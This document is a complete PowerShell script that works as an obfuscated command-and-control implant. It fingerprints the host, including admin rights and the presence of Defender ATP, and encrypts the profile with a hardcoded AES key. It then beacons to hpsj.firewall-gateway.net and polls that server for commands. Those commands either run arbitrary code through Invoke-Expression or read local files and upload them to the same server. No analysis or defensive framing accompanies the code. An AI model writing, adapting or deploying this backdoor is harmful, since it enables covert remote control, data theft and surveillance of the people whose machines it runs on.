$XJWLIAN = 5;
$ZCCJDJCCL = "QUFOVENOWVNETU9UT0hZVVhKVkhHQ1BNSUNSWERTREg=";
$C = "VUVGV1VVT05XWElQVkdORg=="

function D($ZCCJDJCCL, $C) {
    $QPJ = New-Object "System.Security.Cryptography.AesManaged"
    $QPJ.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $QPJ.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $QPJ.BlockSize = 128
    $QPJ.KeySize = 256
    if ($C) {
        if ($C.getType().Name -eq "String") {
            $QPJ.IV = [System.Convert]::FromBase64String($C)
        }
        else {
            $QPJ.IV = $C
        }
    }
    if ($ZCCJDJCCL) {
        if ($ZCCJDJCCL.getType().Name -eq "String") {
            $QPJ.Key = [System.Convert]::FromBase64String($ZCCJDJCCL)
        }
        else {
            $QPJ.Key = $ZCCJDJCCL
        }
    }
    $QPJ
}

function RQCGGL($ZCCJDJCCL, $C, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $QPJ = D $ZCCJDJCCL $C
    $DZOTUJJ = $QPJ.CreateEncryptor()
    $encryptedData = $DZOTUJJ.TransformFinalBlock($bytes, 0, $bytes.Length);
    [System.Convert]::ToBase64String($encryptedData)
}

function HPGV($ZCCJDJCCL, $C, $cipher) {
    $bytes = [System.Convert]::FromBase64String($cipher)
    $QPJ = D $ZCCJDJCCL $C
    $decryptor = $QPJ.CreateDecryptor();
    $IWZWQQK = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [System.Text.Encoding]::UTF8.GetString($IWZWQQK).Trim([char]0)
}


$progressPreference = 'silentlyContinue';
$wc = New-Object system.Net.WebClient;
$wc2 = New-Object system.Net.WebClient;
$wcr = New-Object system.Net.WebClient;
$hostname = $env:COMPUTERNAME;
$Z = RQCGGL $ZCCJDJCCL $C $hostname
$AA = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$r2 = $AA;
$CDDT = "$hostname-$r2";
$KJQ = $env:USERNAME;
$whmenc = RQCGGL $ZCCJDJCCL $C $KJQ
$L = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$AZTN = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($L)";
$SGE = (Get-WmiObject Win32_ComputerSystem).Domain;


$procarch = [Environment]::Is64BitProcess
$procarchf = ""
if ($procarch -eq "True"){$procarchf = "x64"}else{$procarchf="x86"}

$pn = Get-Process -PID $PID | % {$_.ProcessName}; $pnid = $pn + " ($pid) - $procarchf"

$user_identity = [Security.Principal.WindowsIdentity]::GetCurrent();
$iselv = (New-Object Security.Principal.WindowsPrincipal $user_identity).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)

if($iselv){
$KJQ = $KJQ + "*"
}

$random = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Advanced Threat Protection\Status" -Name OnboardingState -ErrorAction SilentlyContinue).OnboardingState;if($random -eq $null){$atp = $false}else{$atp = $true}
$raw_header = "$CDDT,$KJQ,$AZTN,$pnid,$SGE,$atp";
$encrypted_header = RQCGGL $ZCCJDJCCL $C $raw_header;
$final_hostname_encrypted = RQCGGL $ZCCJDJCCL $C $CDDT

$wch = $wc.headers;
$wch.add("Authorization", $encrypted_header);
$wch.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");

$wc.downloadString("http://hpsj.firewall-gateway.net:80/login");
$failure_counter = 0;
while($true){

    try{
    $command_raw = $wc2.downloadString("http://hpsj.firewall-gateway.net:80/view/$CDDT");
    }catch{
    $failure_counter=$failure_counter +1;
    if ($failure_counter -eq 10){
    kill $pid
    }
    }

    $final_command = HPGV $ZCCJDJCCL $C $command_raw
    $fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21)

    if($fc -eq "False"){

    } elseif($fc -eq "Report"){
      $ps = foreach ($i in Get-Process){$i.ProcessName};
      $local_ips = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress;$arr = $local_ips.split("\n");
      $ps+= $arr -join ";"
      $ps+= (Get-WmiObject -Class win32_operatingSystem).version;
      $ps+= (Get-WinSystemLocale).Name
      $ps+= ((get-date) - (gcim Win32_OperatingSystem).LastBootUpTime).TotalHours
      $ps+= Get-Date -Format "HH:mm(MM/dd/yyyy)"
      $pst = RQCGGL $ZCCJDJCCL $C $ps
      $wcrh = $wcr.Headers;
      $wcrh.add("Authorization", $pst);
      $wcrh.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
      $wcrh.add("App-Logic", $Z);
      $wcr.downloadString("http://hpsj.firewall-gateway.net:80/calls");
    } elseif($fc.split(" ")[0] -eq "Download"){
        $filename = RQCGGL $ZCCJDJCCL $C $fc.split("\")[-1]
        $file_content = [System.IO.File]::ReadAllBytes($fc.split(" ")[1])
        $HNRX = [Convert]::ToBase64String($file_content);
        $efc = RQCGGL $ZCCJDJCCL $C $HNRX;
        $QYU = new-object net.WebClient;
        $SOIY = $QYU.Headers;
        $SOIY.add("Content-Type", "application/x-www-form-urlencoded");
        $SOIY.add("x-Authorization", $whmenc);
        $QYU.UploadString("http://hpsj.firewall-gateway.net:80/messages", "fn=$filename&token=$efc");
    } elseif($fc -eq "reset-ps"){
        try{
        # Reset Powershell session (clean)
        # NOT IMPLEMENTED YET
        $ec = "NO";
        }
        catch{
        $ec = $Error[0] | Out-String;
        }

        $HNRX = RQCGGL $ZCCJDJCCL $C $ec;
        $QYU = New-Object system.Net.WebClient;
        $QYU.Headers["App-Logic"] = $final_hostname_encrypted;
        $QYU.Headers["Authorization"] = $HNRX;
        $QYU.Headers["Session"] = $command_raw;
        $QYU.downloadString("http://hpsj.firewall-gateway.net:80/bills");
    } else{
      try{
        $ec = Invoke-Expression ($fc) | Out-String;
        }
        catch{
        $ec = $Error[0] | Out-String;
        }
        $HNRX = RQCGGL $ZCCJDJCCL $C $ec;
        $QYU = New-Object system.Net.WebClient;
        $QYU.Headers["App-Logic"] = $final_hostname_encrypted;
        $QYU.Headers["Authorization"] = $HNRX;
        $QYU.Headers["Session"] = $command_raw;
        $QYU.downloadString("http://hpsj.firewall-gateway.net:80/bills");
    }

    sleep $XJWLIAN;
    }
